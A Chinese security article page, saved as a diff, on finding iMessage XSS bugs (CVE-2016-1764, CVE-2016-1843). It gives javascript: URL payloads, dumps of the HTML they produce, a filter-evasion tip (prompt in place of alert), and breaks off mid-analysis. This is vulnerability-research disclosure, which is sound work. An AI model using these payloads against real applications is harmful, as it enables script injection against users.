@@ -1,0 +1,583 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】从老漏洞到新漏洞：iMessage 0day(CVE-2016-1843)挖掘实录 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="iMessage,0day,iMessage 漏洞,CVE-2016-1843"/>
+    
+        <meta name="description" content="在前几天老外发布了一个在3月更新里修复的iMessage xss漏洞（CVE-2016-1764）细节。他们公布这些细节里其实没有给出详细触发点的分析，我分析后也就是根据这些信息发现了一个新的0day。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】从老漏洞到新漏洞：iMessage 0day(CVE-2016-1843)挖掘实录</h2>
+                <div class="article-msg">
+                    <span class="time">2016-10-12 17:23:11</span>
+                                        <span class="read">阅读：15512次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3098"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3098" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://paper.seebug.org/65/?from=timeline&amp;isappinstalled=0"
+                             target="_blank">来源： SuperHei@seebug</a></span>
+                    
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p7.qhimg.com/t0199ecfe3b6ddf97ab.jpg" title="t01e0f80433dcfdb3e0.jpg" alt="http://p4.qhimg.com/t01e0f80433dcfdb3e0.jpg"/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">文/SuperHei（知道创宇404安全实验室） 2016.4.11</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注：文章里“0day”在报告给官方后分配漏洞编号：CVE-2016-1843</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一、背景</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在前几天老外发布了一个在3月更新里修复的iMessage xss漏洞（CVE-2016-1764）细节 ：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/" _src="https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/">https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://github.com/BishopFox/cve-2016-1764" _src="https://github.com/BishopFox/cve-2016-1764">https://github.com/BishopFox/cve-2016-1764</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">他们公布这些细节里其实没有给出详细触发点的分析，我分析后也就是根据这些信息发现了一个新的0day。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">二、CVE-2016-1764 漏洞分析</span></strong></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">CVE-2016-1764 里的最简单的触发payload： <span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">javascript://a/research?%0d%0aprompt(1)</span> 可以看出这个是很明显javascript协议里的一个小技巧 %0d%0 没处理后导致的 xss ，这个tips在找xss漏洞里是比较常见的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个值得提一下的是 为啥要用<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">prompt(1)</span> 而我们常用的是<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">alert(1)</span> ，我实际测试了下发现alert确实没办法弹出来，另外在很多的网站其实把alert直接和谐过滤了，所以这里给提醒大家的是在测试xss的时候，把 prompt 替换 alert 是有必要的～</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">遇到这样的客户端的xss如果要分析，第一步应该看看location.href的信息。这个主要是看是哪个域下，这个漏洞是在<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">applewebdata://</span>协议下，这个原漏洞分析里有给出。然后要看具体的触发点，一般在浏览器下我们可以通过看html源代码来分析，但是在客户端下一般看不到，所以这里用到一个小技巧：</span></p><pre class="brush:plain;toolbar:false">javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里是看html里的head代码</span></p><pre class="brush:html;toolbar:false">&lt;style&gt;@media&nbsp;screen&nbsp;and&nbsp;(-webkit-device-pixel-ratio:2)&nbsp;{}&lt;/style&gt;&lt;link&nbsp;rel=&quot;stylesheet&quot;&nbsp;type=&quot;text/css&quot;&nbsp;href=&quot;file:///System/Library/PrivateFrameworks/SocialUI.framework/Resources/balloons-modern.css&quot;&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">继续看下body的代码：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:js;toolbar:false">javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)
+&lt;chatitem&nbsp;id=&quot;v:iMessage/xxx@xxx.com/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;role=&quot;heading&quot;&nbsp;aria-level=&quot;1&quot;&nbsp;item-type=&quot;header&quot;&gt;&lt;header&nbsp;guid=&quot;v:iMessage/xxx@xxx.com/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&gt;&lt;headermessage&nbsp;text-direction=&quot;ltr&quot;&gt;与“xxx@xxx.com”进行&nbsp;iMessage&nbsp;通信&lt;/headermessage&gt;&lt;/header&gt;&lt;/chatitem&gt;&lt;chatitem&nbsp;id=&quot;d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;role=&quot;heading&quot;&nbsp;aria-level=&quot;2&quot;&nbsp;item-type=&quot;timestamp&quot;&gt;&lt;timestamp&nbsp;guid=&quot;d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&nbsp;id=&quot;d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&gt;&lt;date&nbsp;date=&quot;481908183.907740&quot;&gt;今天&nbsp;23:23&lt;/date&gt;&lt;/timestamp&gt;&lt;/chatitem&gt;&lt;chatitem&nbsp;id=&quot;p:0/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;chatitem-message=&quot;yes&quot;&nbsp;role=&quot;presentation&quot;&nbsp;display-type=&quot;balloon&quot;&nbsp;item-type=&quot;text&quot;&nbsp;group-last-message-ignore-timestamps=&quot;yes&quot;&nbsp;group-first-message-ignore-timestamps=&quot;yes&quot;&gt;&lt;message&nbsp;guid=&quot;p:0/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx&quot;&nbsp;service=&quot;imessage&quot;&nbsp;typing-indicator=&quot;no&quot;&nbsp;sent=&quot;no&quot;&nbsp;from-me=&quot;yes&quot;&nbsp;from-system=&quot;no&quot;&nbsp;from=&quot;B392EC10-CA04-41D3-A967-5BB95E301475&quot;&nbsp;emote=&quot;no&quot;&nbsp;played=&quot;no&quot;&nbsp;auto-reply=&quot;no&quot;&nbsp;group-last-message=&quot;yes&quot;&nbsp;group-first-message=&quot;yes&quot;&gt;&lt;buddyicon&nbsp;role=&quot;img&quot;&nbsp;aria-label=&quot;黑哥&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody&nbsp;title=&quot;今天&nbsp;23:23:03&quot;&nbsp;aria-label=&quot;javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&quot;&gt;&lt;messagetextcontainer&nbsp;text-direction=&quot;ltr&quot;&gt;&lt;span&nbsp;style=&quot;&quot;&gt;&lt;a&nbsp;href=&quot;&nbsp;&quot;&nbsp;title=&quot;javascript://a/research?&nbsp;&nbsp;
+prompt(1,document.body.innerHTML)&quot;&gt;
+javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&lt;/a&nbsp;&gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date&nbsp;class=&quot;compact&quot;&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;&lt;chatitem&nbsp;id=&quot;p:0/64989837-6626-44CE-A689-5460313DC817&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;chatitem-message=&quot;yes&quot;&nbsp;role=&quot;presentation&quot;&nbsp;display-type=&quot;balloon&quot;&nbsp;item-type=&quot;text&quot;&nbsp;group-first-message-ignore-timestamps=&quot;yes&quot;&nbsp;group-last-message-ignore-timestamps=&quot;yes&quot;&gt;&lt;message&nbsp;guid=&quot;p:0/64989837-6626-44CE-A689-5460313DC817&quot;&nbsp;typing-indicator=&quot;no&quot;&nbsp;sent=&quot;no&quot;&nbsp;from-me=&quot;no&quot;&nbsp;from-system=&quot;no&quot;&nbsp;from=&quot;D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99&quot;&nbsp;emote=&quot;no&quot;&nbsp;played=&quot;no&quot;&nbsp;auto-reply=&quot;no&quot;&nbsp;group-first-message=&quot;yes&quot;&nbsp;group-last-message=&quot;yes&quot;&gt;&lt;buddyicon&nbsp;role=&quot;img&quot;&nbsp;aria-label=&quot;黑哥&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody&nbsp;title=&quot;今天&nbsp;23:23:03&quot;&nbsp;aria-label=&quot;javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&quot;&gt;&lt;messagetextcontainer&nbsp;text-direction=&quot;ltr&quot;&gt;&lt;span&nbsp;style=&quot;&quot;&gt;&lt;a&nbsp;href=&quot;javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&quot;&nbsp;title=&quot;javascript://a/research?&nbsp;&nbsp;
+prompt(1,document.body.innerHTML)&quot;&gt;
+javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)&lt;/a&nbsp;&gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date&nbsp;class=&quot;compact&quot;&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;&lt;chatitem&nbsp;id=&quot;p:0/AE1ABCF1-2397-4F20-A71F-D71FFE8042F5&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;chatitem-message=&quot;yes&quot;&nbsp;role=&quot;presentation&quot;&nbsp;display-type=&quot;balloon&quot;&nbsp;item-type=&quot;text&quot;&nbsp;group-last-message-ignore-timestamps=&quot;yes&quot;&nbsp;group-first-message-ignore-timestamps=&quot;yes&quot;&gt;&lt;message&nbsp;guid=&quot;p:0/AE1ABCF1-2397-4F20-A71F-D71FFE8042F5&quot;&nbsp;service=&quot;imessage&quot;&nbsp;typing-indicator=&quot;no&quot;&nbsp;sent=&quot;no&quot;&nbsp;from-me=&quot;yes&quot;&nbsp;from-system=&quot;no&quot;&nbsp;from=&quot;B392EC10-CA04-41D3-A967-5BB95E301475&quot;&nbsp;emote=&quot;no&quot;&nbsp;played=&quot;no&quot;&nbsp;auto-reply=&quot;no&quot;&nbsp;group-last-message=&quot;yes&quot;&nbsp;group-first-message=&quot;yes&quot;&gt;&lt;buddyicon&nbsp;role=&quot;img&quot;&nbsp;aria-label=&quot;黑哥&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody&nbsp;title=&quot;今天&nbsp;23:24:51&quot;&nbsp;aria-label=&quot;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&quot;&gt;&lt;messagetextcontainer&nbsp;text-direction=&quot;ltr&quot;&gt;&lt;span&nbsp;style=&quot;&quot;&gt;&lt;a&nbsp;href=&quot;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&quot;&nbsp;title=&quot;javascript://a/research?&nbsp;&nbsp;
+prompt(1,document.head.innerHTML)&quot;&gt;
+javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&lt;/a&nbsp;&gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date&nbsp;class=&quot;compact&quot;&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;&lt;chatitem&nbsp;id=&quot;s:AE1ABCF1-2397-4F20-A71F-D71FFE8042F5&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;role=&quot;heading&quot;&nbsp;aria-level=&quot;1&quot;&nbsp;item-type=&quot;status&quot;&nbsp;receipt-fade=&quot;in&quot;&gt;&lt;receipt&nbsp;from-me=&quot;YES&quot;&nbsp;id=&quot;receipt-delivered-s:ae1abcf1-2397-4f20-a71f-d71ffe8042f5&quot;&gt;&lt;div&nbsp;class=&quot;receipt-container&quot;&gt;&lt;div&nbsp;class=&quot;receipt-item&quot;&gt;已送达&lt;/div&gt;&lt;/div&gt;&lt;/receipt&gt;&lt;/chatitem&gt;&lt;chatitem&nbsp;id=&quot;p:0/43545678-5DB7-4B35-8B81-xxxxxxxxxxxx&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;chatitem-message=&quot;yes&quot;&nbsp;role=&quot;presentation&quot;&nbsp;display-type=&quot;balloon&quot;&nbsp;item-type=&quot;text&quot;&nbsp;group-first-message-ignore-timestamps=&quot;yes&quot;&nbsp;group-last-message-ignore-timestamps=&quot;yes&quot;&gt;&lt;message&nbsp;guid=&quot;p:0/43545678-5DB7-4B35-8B81-xxxxxxxxxxxx&quot;&nbsp;typing-indicator=&quot;no&quot;&nbsp;sent=&quot;no&quot;&nbsp;from-me=&quot;no&quot;&nbsp;from-system=&quot;no&quot;&nbsp;from=&quot;D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99&quot;&nbsp;emote=&quot;no&quot;&nbsp;played=&quot;no&quot;&nbsp;auto-reply=&quot;no&quot;&nbsp;group-first-message=&quot;yes&quot;&nbsp;group-last-message=&quot;yes&quot;&gt;&lt;buddyicon&nbsp;role=&quot;img&quot;&nbsp;aria-label=&quot;黑哥&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody&nbsp;title=&quot;今天&nbsp;23:24:51&quot;&nbsp;aria-label=&quot;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&quot;&gt;&lt;messagetextcontainer&nbsp;text-direction=&quot;ltr&quot;&gt;&lt;span&nbsp;style=&quot;&quot;&gt;&lt;a&nbsp;href=&quot;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&quot;&nbsp;title=&quot;javascript://a/research?&nbsp;&nbsp;
+prompt(1,document.head.innerHTML)&quot;&gt;
+javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&lt;/a&nbsp;&gt;&lt;/span&gt;&lt;/messagetextcontainer&gt;&lt;/messagebody&gt;&lt;message-overlay&gt;&lt;/message-overlay&gt;&lt;/messagetext&gt;&lt;date&nbsp;class=&quot;compact&quot;&gt;&lt;/date&gt;&lt;/message&gt;&lt;spacer&gt;&lt;/spacer&gt;&lt;/chatitem&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">那么关键的触发点:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:html;toolbar:false">&lt;a&nbsp;href=&quot;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&quot;&nbsp;title=&quot;javascript://a/research?&nbsp;&nbsp;
+prompt(1,document.head.innerHTML)&quot;&gt;javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)&lt;/a&nbsp;&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">就是这个了。 javascript直接进入a标签里的href，导致点击执行。新版本的修复方案是直接不解析<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">javascript://</span> 。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">三、从老漏洞(CVE-2016-1764)到0day</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">XSS的漏洞本质是你注入的代码最终被解析执行了，既然我们看到了<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">document.head.innerHTML</span>的情况，那么有没有其他注入代码的机会呢？首先我测试的肯定是还是那个点，尝试用<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">&quot;</span>及<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">&lt;&gt;</span>去闭合，可惜都被过滤了，这个点不行我们可以看看其他存在输入的点，于是我尝试发个附件看看解析情况，部分代码如下：</span></p><pre class="brush:html;toolbar:false">&lt;chatitem&nbsp;id=&quot;p:0/FE98E898-0385-41E6-933F-8E87DB10AA7E&quot;&nbsp;contiguous=&quot;no&quot;&nbsp;chatitem-message=&quot;yes&quot;&nbsp;role=&quot;presentation&quot;&nbsp;display-type=&quot;balloon&quot;&nbsp;item-type=&quot;attachment&quot;&nbsp;group-first-message-ignore-timestamps=&quot;yes&quot;&nbsp;group-last-message-ignore-timestamps=&quot;yes&quot;&gt;&lt;message&nbsp;guid=&quot;p:0/FE98E898-0385-41E6-933F-8E87DB10AA7E&quot;&nbsp;typing-indicator=&quot;no&quot;&nbsp;sent=&quot;no&quot;&nbsp;from-me=&quot;no&quot;&nbsp;from-system=&quot;no&quot;&nbsp;from=&quot;D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99&quot;&nbsp;emote=&quot;no&quot;&nbsp;played=&quot;no&quot;&nbsp;auto-reply=&quot;no&quot;&nbsp;group-first-message=&quot;yes&quot;&nbsp;group-last-message=&quot;yes&quot;&gt;&lt;buddyicon&nbsp;role=&quot;img&quot;&nbsp;aria-label=&quot;黑哥&quot;&gt;&lt;div&gt;&lt;/div&gt;&lt;/buddyicon&gt;&lt;messagetext&gt;&lt;messagebody&nbsp;title=&quot;今天&nbsp;23:34:41&quot;&nbsp;file-transfer-element=&quot;yes&quot;&nbsp;aria-label=&quot;文件传输:&nbsp;tttt.html&quot;&gt;&lt;messagetextcontainer&nbsp;text-direction=&quot;ltr&quot;&gt;&lt;transfer&nbsp;class=&quot;transfer&quot;&nbsp;id=&quot;45B8E6BD-9826-47E2-B910-D584CE461E5F&quot;&nbsp;guid=&quot;45B8E6BD-9826-47E2-B910-D584CE461E5F&quot;&gt;&lt;transfer-atom&nbsp;draggable=&quot;true&quot;&nbsp;aria-label=&quot;tttt.html&quot;&nbsp;id=&quot;45B8E6BD-9826-47E2-B910-D584CE461E5F&quot;&nbsp;guid=&quot;45B8E6BD-9826-47E2-B910-D584CE461E5F&quot;&gt;&lt;&nbsp;img&nbsp;class=&quot;transfer-icon&quot;&nbsp;extension=&quot;html&quot;&nbsp;aria-label=&quot;文件扩展名:&nbsp;html&quot;&nbsp;style=&quot;content:&nbsp;-webkit-image-set(url(transcript-resource://iconpreview/